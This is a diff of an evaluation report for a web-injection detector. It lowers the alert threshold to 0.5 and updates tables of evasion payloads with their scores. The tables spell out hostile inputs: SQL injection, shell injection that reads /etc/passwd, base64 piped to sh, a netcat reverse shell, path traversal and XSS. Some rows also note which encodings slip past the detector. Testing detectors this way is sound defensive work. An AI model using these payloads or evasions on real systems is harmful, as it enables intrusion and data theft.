@@ -8,20 +8,19 @@ the request path and query) against well-known evasion techniques. It shows what
 **What it is not.** A detection rate on real traffic, a benchmark against other products, or a statement about the DNS,
 beaconing, exfiltration and TLS detectors, which are stateful and are not covered here.
 
-Two thresholds: *caught* is a finding of at least 0.3 with the right label, the detector's floor. *Alert-grade* is at least 0.7,
-where the control plane raises an alert by itself without a matching rule. Remember that no detector can block: a rule
+Two thresholds: *caught* is a finding of at least 0.3 with the right label, the detector's floor. *Alert-grade* is at least 0.5,
+where the control plane raises an alert by itself without a matching rule (0.5 for these web-injection labels, `policy.classifier_alert_threshold` = 0.7 for the rest). No detector can block: a rule
 a human approved is what enforces.
 
-**43 cases: 14 alert-grade, 14 caught below alert grade, 15 missed** (28 of 43 detected).
+**43 cases: 24 alert-grade, 4 caught below alert grade, 15 missed** (28 of 43 detected).
 
 ## Headline findings
 
-- **Most single-rule hits are labelled but do not raise an alert.** 14 of 43 cases landed between 0.3 and 0.7,
-  including the textbook `<script>alert(1)</script>` and a bare `|id`. The label is stored on the flow, but Tier 2 alone raises
-  an alert only at the bundle's classifier threshold (0.7 by default); a high Tier 1 anomaly score can still raise one.
-- **The starter rule that blocks web injection needs 0.9.** Only the payloads that trip two or more rules reach it, so the
-  baseline `UNION SELECT` (0.88) is alert-grade but is not blocked by the starter pack. Lowering the threshold trades missed
-  attacks for blocked legitimate requests; that choice belongs to the operator, which is why it is a rule a person approves.
+- **4 of 43 cases are labelled but do not raise an alert** (between 0.3 and 0.5).
+  The label is stored on the flow, but Tier 2 alone raises an alert only at 0.5 or more; a high Tier 1 anomaly score can still raise one.
+- **The starter rule that blocks web injection needs 0.9.** Only payloads that trip two or more rules reach it, so blocking stays
+  conservative on purpose: a miss costs an alert you did not get, a wrong block costs a legitimate request. The alert threshold
+  is a setting; the block threshold is a rule a person approves.
 - **15 cases are missed outright.** Mostly encodings and spellings the normaliser does not undo (versioned SQL
   comments, full-width letters, HTML entities, wildcards and quote-splitting in shell words) and thresholds a lone weak rule does not reach.
 - **The detector is a first line, not a verdict.** NeuraWall's design assumes this: a model or heuristic can only raise an alert,
@@ -38,8 +37,8 @@ a human approved is what enforces.
 | double URL-encoded | `/item?id=1%2527%2520UNION%2520SELECT%2520pass%2520FROM%2520users--` | alert-grade | 0.88 |  |
 | newline as whitespace | `/item?id=1'%0aUNION%0aSELECT%0apass%0aFROM%0ausers--` | alert-grade | 0.88 |  |
 | tautology without quotes | `/item?id=1 AND 1=1` | caught | 0.31 |  |
-| time-based blind | `/item?id=1;SELECT pg_sleep(5)--` | caught | 0.50 | a single strong pattern scores 0.50, under the alert-grade line |
-| stacked query | `/item?id=1;DROP TABLE users--` | caught | 0.62 | a single strong pattern scores 0.62, under the alert-grade line |
+| time-based blind | `/item?id=1;SELECT pg_sleep(5)--` | alert-grade | 0.50 |  |
+| stacked query | `/item?id=1;DROP TABLE users--` | alert-grade | 0.62 |  |
 | MySQL versioned comment | `/item?id=1/*!50000UNION*//*!50000SELECT*/pass/*!50000FROM*/users` | **missed** | 0.00 | the comment stripper removes the whole /*!...*/ block, including the keyword inside it |
 | full-width Unicode keywords | `/item?id=1' %EF%BC%B5%EF%BC%AE%EF%BC%A9%EF%BC%AF%EF%BC%AE SELECT 1--` | **missed** | 0.00 | lower-casing does not fold full-width letters, and no rule fires without the keywords |
 | quadruple URL-encoding | `/item?id=1%25252527%252520UNION%252520SELECT%252520pass%252520FROM%252520users--` | alert-grade | 0.88 | still caught, through the other rules, although the UNION rule itself does not fire |
@@ -49,11 +48,11 @@ a human approved is what enforces.
 | technique | request path | result | confidence | note |
 |---|---|---|---|---|
 | separator + cat | `/ping?host=1.1.1.1;cat /etc/passwd` | alert-grade | 0.92 |  |
-| pipe + id | `/ping?host=1.1.1.1\|id` | caught | 0.62 | one pattern scores 0.62, under the alert-grade line |
-| command substitution | `/ping?host=$(whoami)` | caught | 0.62 | one pattern scores 0.62, under the alert-grade line |
-| backticks | `/ping?host=`id`` | caught | 0.62 | one pattern scores 0.62, under the alert-grade line |
+| pipe + id | `/ping?host=1.1.1.1\|id` | alert-grade | 0.62 |  |
+| command substitution | `/ping?host=$(whoami)` | alert-grade | 0.62 |  |
+| backticks | `/ping?host=`id`` | alert-grade | 0.62 |  |
 | ${IFS} as whitespace | `/ping?host=1;cat${IFS}/etc/passwd` | alert-grade | 0.92 |  |
-| base64 into a shell | `/ping?host=1;echo Y2F0IC9ldGMvcGFzc3dk\|base64 -d\|sh` | caught | 0.62 | caught through the `| sh` rule alone (0.62) |
+| base64 into a shell | `/ping?host=1;echo Y2F0IC9ldGMvcGFzc3dk\|base64 -d\|sh` | alert-grade | 0.62 |  |
 | reverse shell | `/ping?host=1;nc 10.0.0.1 4444 -e /bin/sh` | alert-grade | 0.98 |  |
 | quote splitting | `/ping?host=1;c'a't /etc/passwd` | **missed** | 0.00 | c'a't defeats the command-name rule; /etc/passwd alone scores 0.27, under the floor |
 | wildcards instead of names | `/ping?host=1;/???/c?t /e??/p??s??` | **missed** | 0.00 | neither a known command name nor a literal sensitive path appears |
@@ -75,7 +74,7 @@ a human approved is what enforces.
 |---|---|---|---|---|
 | dot-dot-slash, three levels | `/files?name=../../../etc/passwd` | alert-grade | 0.92 |  |
 | URL-encoded slashes | `/files?name=..%2f..%2f..%2fetc%2fpasswd` | alert-grade | 0.92 |  |
-| backslashes | `/files?name=..\..\..\windows\win.ini` | caught | 0.62 | one pattern scores 0.62, under the alert-grade line |
+| backslashes | `/files?name=..\..\..\windows\win.ini` | alert-grade | 0.62 |  |
 | absolute sensitive path | `/files?name=/etc/passwd` | **missed** | 0.00 | a reference to /etc/passwd alone scores 0.27, under the 0.3 floor |
 | single level | `/files?name=../secret.txt` | **missed** | 0.00 | two or more consecutive ../ are required |
 | Tomcat ..;/ form | `/files/..;/..;/admin` | **missed** | 0.00 |  |
@@ -85,9 +84,9 @@ a human approved is what enforces.
 
 | technique | request path | result | confidence | note |
 |---|---|---|---|---|
-| script tag | `/s?q=<script>alert(1)</script>` | caught | 0.62 | the canonical payload scores 0.62, under the alert-grade line |
-| mixed-case script tag | `/s?q=<ScRiPt>alert(1)</sCrIpT>` | caught | 0.62 | 0.62, under the alert-grade line |
-| URL-encoded script tag | `/s?q=%3Cscript%3Ealert(1)%3C/script%3E` | caught | 0.62 | 0.62, under the alert-grade line |
+| script tag | `/s?q=<script>alert(1)</script>` | alert-grade | 0.62 |  |
+| mixed-case script tag | `/s?q=<ScRiPt>alert(1)</sCrIpT>` | alert-grade | 0.62 |  |
+| URL-encoded script tag | `/s?q=%3Cscript%3Ealert(1)%3C/script%3E` | alert-grade | 0.62 |  |
 | img onerror | `/s?q=<img src=x onerror=alert(1)>` | caught | 0.45 | one pattern scores 0.45, under the alert-grade line |
 | svg onload without space | `/s?q=<svg/onload=alert(1)>` | caught | 0.45 | one pattern scores 0.45, under the alert-grade line |
 | javascript: URI | `/s?next=javascript:alert(1)` | caught | 0.38 |  |
